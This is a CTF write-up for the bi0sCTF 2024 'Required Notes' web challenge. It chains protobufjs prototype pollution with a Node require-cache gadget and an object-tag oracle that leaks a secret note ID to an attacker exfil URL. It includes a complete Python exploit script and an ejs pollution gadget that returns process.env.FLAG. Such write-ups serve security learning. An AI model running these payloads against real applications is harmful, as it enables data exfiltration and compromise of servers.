+++
title = 'Required Notes - bi0sCTF 2024'
date = 2024-02-28 14:01:06
draft = false
tags = ["web","nodejs","require","prototype pollution"]
+++


**tl;dr**

+ [prototype pollution](https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665) in protobufjs
+ Require gadget to "map" Healthcheck note to attacker note
+ Bypass _pathCache checks by using relativeResolveCache[relResolveCacheIdentifier] which is not deleted upon clearing cache
+ User object tag to leak admin note id character by character with ssleaks.

<!--more-->

**Challenge points**: 998
**No. of solves**: 3
**Solved by**: [Z_Pacifist](https://twitter.com/ZePacifist)

## Challenge Description

Every CTF requires an overly complicated notes app.
Download files from: [link](https://github.com/teambi0s/bi0sCTF/tree/main/2024/Web/requirednotesrevenge/handout)


## Analysis

Lets take a quick look at all the routes that are available to us:
```html
/delete -  Runs cleanserver() function which deletes require.cache.
/search/:noteId - Searches for given noteId. This endpoint uses restrictToLocalhost middleware which restricts access to localhost.
/customise - To edit the protobuf configuration file. User input is directly written to settings.proto file.
/create - Create a new note which after validation with protobuf is stored into a file /note/noteId.json where noteId is randomly generated.
/view/:noteId - To view the generated note and delete them.
/healthcheck - run the healthcheck() function inside bot.js which visits /view/Healthcheck.

```

The healthcheck note and flag note are generated when the application starts.
```javascript
...
let flag = process.env.FLAG;
if(!flag){
  flag='{"title":"flag","content":"bi0sctf{fake_flag}"}';
}
else{
  flag=`{"title":"flag","content":"${flag}"}`;
}
const flagid = generateNoteId(16);
const healthCheckId='Healthcheck';
fs.writeFileSync(`./notes/${flagid}.json`, flag);
fs.writeFileSync(`./notes/${healthCheckId}.json`, '{"title":"Healthcheck","content":"success"}');
...

```

The flag is in a file within notes directory with a random id as the name.
```javascript
function generateNoteId(length) {
  const characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = crypto.randomInt(characters.length);
    result += characters.charAt(randomIndex);
  }
  return result;
}
...
```

Apart from an index.js, there is also a bot.js which contains code for the admin bot. It sets Javascript execution off and only visits the Healthcheck note.
```javascript
...
const page = await browser.newPage();
await page.setJavaScriptEnabled(false)
const response=await page.goto("http://localhost:3000/view/Healthcheck")
await browser.close();
...
```
Problem number 1 is that unlike typical XSS challenges where admin bot visits a url with attacker content, here the bot only vists a pre-set url. The content of Healthcheck note is not under our control. Or is it?
Problem number 2 is that javascript execution is disabled.

<br>

Lets tackle problem number 2 first. Looking closer at the /search endpoint, we can discover a leak oracle.
```javascript
app.get('/search/:noteId', (req, res) => {
  const noteId = req.params.noteId;
  const notes=glob.sync(`./notes/${noteId}*`);
  if(notes.length === 0){
    return res.json({Message: "Not found"});
  }
  else{
    try{
      fs.accessSync(`./notes/${noteId}.json`);
      return res.json({Message: "Note found"});
    }
    catch(err){
      return res.status(500).json({ Message: 'Internal server error' });
    }
  }

})
```
The `/search/` endpoint uses the glob module with `./notes/${noteId}*` which can be used to search for a noteId character by character. Lets say if a noteId `abcd.json` exists and we send a request to `/search/a`, notes.length becomes 1 but `fs.accessSync(./notes/a.json)` will throw an error since a.json is not a valid noteId and it will return status 500. Instead if note searched was `/search/b` then glob.sync will set notes.length 0 and return status code 200 with message "Not found".

We'll take a look at how to exploit this later on but there is one more condition(middleware) set on the /search endpoint that we need to keep in mind.

```javascript
const restrictToLocalhost = (req, res, next) => {
  const remoteAddress = req.connection.remoteAddress;
  if (remoteAddress === '::1' || remoteAddress === '127.0.0.1' || remoteAddress === '::ffff:127.0.0.1') {
    next();
  } else {
    res.status(403).json({ Message: 'Access denied' });
  }
};
...

...
app.use('/search', restrictToLocalhost);
```
The search endpoint is only accessible by localhost.
Hence we need to find a way to make use of the admin bot to utilize the oracle in `/search` endpoint to leak flag note id.

---
<br>

The challenge uses protobufjs 7.2.3 which has a prototype pollution CVE [https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665](https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665) 
Calling protobuf.parse() with attacker controlled schema is possible due to the file write to settings.proto in the `/customise` endpoint
```javascript
const { data } = req.body;

    let author = data.pop()['author'];

    let title = data.pop()['title'];

    let protoContents = fs.readFileSync('./settings.proto', 'utf-8').split('\n');
...

...
if (author) {
      protoContents[5] = `  ${author} string author = 3 [default="user"];`;
    }

    if (title) {
      protoContents[3] = `  ${title} string title = 1 [default="user"];`;
    }
fs.writeFileSync('./settings.proto', protoContents.join('\n'), 'utf-8');
```
The endpoint takes author and title in an array called data and writes whatever is sent into the file `settings.proto`.

| Note: a few filters were added here to minimize the playing field for prototype pollution gadgets but players still managed to bypass them :slightly_smiling_face: .


At `/create`, protobuf.parse() is called. which ends up polluting the prototype.
```javascript
app.post('/create', (req, res) => {
  requestBody=req.body
  try{
    schema = fs.readFileSync('./settings.proto', 'utf-8');
    root = protobuf.parse(schema).root;
    Note = root.lookupType('Note');
    errMsg = Note.verify(requestBody);
...
```
<br>

Now that we have prototype pollution, we can make use of that to pollute some properties that will load an attacker note instead of Healthcheck note when admin bot visits.

One such gadget can be seen in  nodejs require function. [https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529](https://github.com/nodejs/node/blob/v20.2.0/lib/internal/modules/cjs/loader.js#L529) which lets us use `__proto__.path`, `__proto__.data.name` and `__proto__.data.exports` to load a "malicious" module/file specified in exports whenever require('name') is called.
```javascript
...
function trySelf(parentPath, request) {
  if (!parentPath) return false;

  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
  if (!pkg || pkg.exports === undefined) return false;
  if (typeof pkg.name !== 'string') return false;

  let expansion;
  if (request === pkg.name) {
    expansion = '.';
  } else if (StringPrototypeStartsWith(request, `${pkg.name}/`)) {
    expansion = '.' + StringPrototypeSlice(request, pkg.name.length);
  } else {
    return false;
  }
...
```
readPackageScope is a function which looks for the package.json which contains details about modules to load but in this particular challenge, the package.json is deleted which makes the function return undefined.

pkg.exports and pkg.name, now undefined, is taken from the prototype. This has been described in much better detail in the following blogs and I'd recommend giving them a read.
[https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs](https://ctf.zeyu2001.com/2022/balsnctf-2022/2linenodejs)
[https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/](https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/)



## Exploitation

Combining all the above parts, we can formulate a plan that involves the following steps:
+ Use prototype pollution in protobufjs to "remap" Healthcheck note to attacker note.
+ Attacker note contains payload which leaks flag id using `/search` endpoint.

Let's take a closer look at how we can achieve this.
```json
{"data":[{"title":"option(a).constructor.prototype.data={};optional"},{"author":"optional"}]}
{"data":[{"title":"option(a).constructor.prototype.data.name=\"./notes/Healthcheck\";optional"},{"author":"optional"}]}
{"data":[{"title":"option(a).constructor.prototype.data.exports=\"./notes/di1k8m47ob.json\";optional"},{"author":"optional"}]}
```
Sending the above payloads to /customise endpoint and then `/create` to create a note will pollute the required fields which will set `/notes/di1k8m47ob.json` as the module to be loaded whenever `/notes/Healthcheck` is "require"d. ie. sending request to /view/Healthcheck after doing the pollution should result in di1k8m47ob.json being rendered.
Here is where we will face another road-block.

```javascript
app.get('/view/:noteId', (req, res) => {
  const noteId = req.params.noteId;

  try {
    let note=require.resolve(`./notes/${noteId}`);
    if(!note.endsWith(".json")){
      return res.status(500).json({ Message: 'Internal Server Error' });
    }

    let noteData = require(`./notes/${noteId}`);
    for (var key in module.constructor._pathCache) {
      if (key.startsWith("./notes/"+noteId)){
        if (!module.constructor._pathCache[key].endsWith(noteId+".json")){
          if (noteId===healthCheckId){
            cleanserver();
          }
          delete module.constructor._pathCache[key];
          return res.status(500).json({ Message: 'Internal Server Error' });
        }
      }
    }
...
```

There are checks implemented here on `_pathCache` to check whether the module that is loaded is the one that is actually required.

This check can be bypassed but before that lets have a quick rundown of how `require()` actually works. (The challenge uses node 20.2.0 and a few changes have happened since then ).

[https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L1023)
The three functions involved here are `Module._load`, `Module._resolveFilename` and `module._findPath()`. 
When a file is require()’d for the first time, it does not exists in any cache. `Module._load` calls `Module._resolveFilename` and finally ends up in `module._findPath()` 
Module.\_findPath() is the function which finds valid file path. [Valid extensions](https://github.com/nodejs/node/blob/beb0520af74ed20c3d48a1b4f6ca8a89664976c6/lib/internal/modules/cjs/loader.js#L582) are .js, .json and .node.
After getting valid file name, the following code is run.

```jsx
if (filename) {
      Module._pathCache[cacheKey] = filename;
      return filename;
    }
```

This returns  filename and adds it to `_pathCache`. 
At Module.\_load, it is checked if cache[filename] is in require.cache. If not, after module is loaded, `require.cache[filename]=module` is added and relativeResolveCache[relResolveCacheIdentifier]=filename. is also set.

```jsx
Module._cache[filename] = module;
  if (parent !== undefined) {
    relativeResolveCache[relResolveCacheIdentifier] = filename;
  }
```


---

Now, for the case after a file has been loaded into cache: whenever `Module._load` is called, it first checks if the require()’d filepath has an entry in relativeResolveCache **and** if it is cached in require.cache.

If yes, the exported module  in require.cache[filename] is returned from there.

(Note - filename is relativeResolveCache[relResolveCacheIdentifier])

If the require()’d filename is in relativeResolveCache but not in require.cache, it is deleted from relativeResolveCache and the rest of the code is executed.

---

A more detailed look at the working can be found in the link below
[https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/](https://oatmeal.vip/security/web-learning/balsn-ctf-20222linenodejs/)

---

Now, back to the road-block and how to get around it.
When we use prototype pollution to "remap" lets say, note `abc` to `xyz`, At `Module._load`, relResolveCacheIdentifier is generated with `abc`. `Module._resolveFilename` and `Module._findPath` are called and \_pathCache entry would look like `./notes/abc=<path>xyz.json`.
`filename` returned to `Module._load` is that of `xyz` and that is xyz is loaded into `Module._cache[<xyz filepath>]`. `relativeResolveCache[relResolveCacheIdentifier of abc]` is set to `<xyz filepath>`.

If `_pathCache` key and value do not match, the entry is deleted from `_pathCache`.

If the attack is tried on Healthcheck noteId, the cleanserver() function also gets executed
```javascript
const cleanserver = () => {
  Object.keys(require.cache).forEach(i => {
    delete require.cache[i];
  });
};
```

This basically means that if `/note/Healthcheck -> 
/note/attackernote` is set, cache is cleared and the require gadget will not work. Our plan for rebinding Healthcheck note to attacker note will fail except for the fact that when cache is cleared, relativeResolveCache entries are not deleted. The entry in relativeResolveCache is deleted when require tries to load the module and it does not exist in require.cache.

This opens up the possiblity of the following
First pollute `/note/Healthcheck` -> `/note/attacker.json`
Then visit `/view/Healthcheck` to delete pathcache entries which prevent note rendering.
Then pollute `/note/random` -> `/note/attacket.json` to add attacker.json to require.cache.
Now when `/view/Healthcheck` is visited, `_pathCache` does not have any entries with Healthcheck in the key; relativeResolveCache \[\<Healthcheck relResolveIdentifier\>\] still contains the file path of attacker.json as value and loads attacker.json from cache.
Hence we are able to bypass the check
    
---

### Final steps

Now that we have the ability to make the admin bot "visit" an attacker note we need to find a way to leak the flag note id from the `/search` endpoint without javascript.

The `<object data='link'>other data</object>` tag will render anything provided within the tag if the link returns 400/500 status code.
We can nest tags like `<object data='http://127.0.0.1:3000/search/a'>object data='<exfil_url>/found/a'></object></object>`. This will send callback to exfil_url if there exists a note starting with `a` as the response status code will be 500.

_This is where I might have overly complicated stuff_

The note id is 16 characters in length. We can leak id character by character by using `payload=payload+f"<object data='http://127.0.0.1:3000/search/{i}'><object data='<exfil_url>/found/{i}'></object></object>"` and replacing `{i}` with the found id. In order to leak all characters, we can create multiple notes with one or two characters leak each. But here is where another problem occurs. If we want to pollute Healthcheck to a new note with the prototype won't be overwritten if we do the pollution again, it will create an array with both old and new polluted values. ie. data.name will become \['/note/first','/notes/second'\]

To get around this, we can pollute `data` once more, make it an array, then send an empty json `{}` to `/customise` 
```javascript
app.post('/customise',(req, res) => {
  try {
    const { data } = req.body;

    let author = data.pop()['author'];

    let title = data.pop()['title'];
...
```
data.pop() is called and the data array is cleared. Now polluting data.name and data.exports will take effect.

The following script combines all these actions to leak the flag character by character:
```python
import requests
from flask import Flask
import string
import time
from threading import Thread


charset=string.digits+string.ascii_lowercase
url="<instance_url>"
proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
useless={"title":"useless","content":"just useless"}

app = Flask(__name__)

def gen_payload(fchar):
    payload=""
    for i in charset:
        i=fchar+i
        payload=payload+f"<object data='http://127.0.0.1:3000/search/{i}'><object data='<exfil_url>/found/{i}'></object></object>"
    return payload

# Reset settings.proto to clean
def reset_settings():
	options={"data":[{"title":"optional"},{"author":"optional"}]}
	r=requests.post(url+"customise", json=options, proxies=proxies, verify=False)
	print(r.text)


# Write payload note:
def write_expl(expl):
	reset_settings()
	payload={"title":"asdf","content":expl}
	r=requests.post(url+"create", json=payload, proxies=proxies, verify=False)
	print("Message From write_expl",r.json()["Message"])
	payload_id=r.json()["Noteid"]
	return payload_id


def polluter(x,y):
	options={"data":[{"title":"option(a).constructor.prototype.data={};optional"},{"author":"optional"}]}
	requests.post(url+"customise", json=options, proxies=proxies, verify=False)
	requests.post(url+"create", json=useless, proxies=proxies, verify=False)
	options={} # For data.pop()
	requests.post(url+"customise", json=options, proxies=proxies, verify=False)
	#change name to healthcheck note id
	options={"data":[{"title":"option(a).constructor.prototype.data.name=\"./notes/"+x+"\";optional"},{"author":"optional"}]}
	requests.post(url+"customise", json=options, proxies=proxies, verify=False)
	requests.post(url+"create", json=useless, proxies=proxies, verify=False)
	#change name to exploit note id
	options={"data":[{"title":"option(a).constructor.prototype.data.exports=\"./notes/"+y+".json\";optional"},{"author":"optional"}]}
	requests.post(url+"customise", json=options, proxies=proxies, verify=False)
	requests.post(url+"create", json=useless, proxies=proxies, verify=False)


def one_step(note):
	requests.get(url+"delete") # clear cache
	note_id=write_expl(note)
	polluter("Healthcheck",note_id)
	requests.get(url+"view/Healthcheck", verify=False) # get Healthcheck->note_id into resolve cache & deletes require cache and pathcache
	
	polluter("777",note_id)
	requests.get(url+"view/777", verify=False) # get note_id into require cache so Healthcheck->note_id becomes alive again
	requests.get(url+"view/"+note_id+"?temp", verify=False) # delete exploit note from file system
	r=requests.get(url+"healthcheck", verify=False) 
	print(r.text)
	

# Starting off
#path has to be set only once
#data pop trick also only once needed but does not affect much if done over again also

print("wht")
requests.packages.urllib3.disable_warnings()
options={"data":[{"title":"option(a).constructor.prototype.path=\"./\";optional"},{"author":"optional"}]}
requests.post(url+"customise", json=options, proxies=proxies, verify=False)
requests.post(url+"create", json=useless, proxies=proxies, verify=False)


def attack(found):
	payload=gen_payload(found)
	one_step(payload)


@app.route('/')
def hello():
	attack("")
	return 'Hello, attacker!'

@app.route('/found/<note>')
def found(note):
	print("Found: ",note)
	try:
		thread=Thread(target=attack,args=(note,))
		thread.start()
	except Exception as e:
		print(e)
	return f'You found: {note}'


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```
This will retreive all but last character of the flag note id which can be bruteforced to get the flag.

---

Another simple approach to leaking the flag would be to create an iframe on the attacker note pointing to attacker controlled server where dynamic content can be served. While this is much more simple, I like the complicated approach more :)

### Other interesting solution

Believe it or not, giving free prototype pollution on a nodejs server with multiple dependencies to ctf players is not a good idea but it was cool to see all the gadgets that they found to solve this challenge. A few interesting ones are:

1.
```
[Object: null prototype] {
client: true,
escapeFunction: '1; return process.env.FLAG'
}
```
This was the easiest solution that was overlooked and one of the main fixes in the revenge challenge. It used a known "wont-fix" ejs gadget to simply return process.env.FLAG and will give the flag on render of any page using ejs.

A few teams also used similar approach to the above to get RCE on the server to get the flag.

2.
gadgets in puppeteer - https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2

3.
polluting express cache instead of require cache
```
noteId: { match: 'Healthcheck', value: '<attackernote>' }
```
This was quite interesting as the approach was very similar to the intended one but bypassed all restrictions on require cache.


### Final thoughts

The design of this challenge started out based on research done during solving of [“required”](https://ctftime.org/task/24394), a reversing challenge from hxpCTF 2022. Even though it seems like no one caught on to the weird caching problems that arise from the way prototype pollution gadget and cache's interact with each other, the methods players used were very interesting.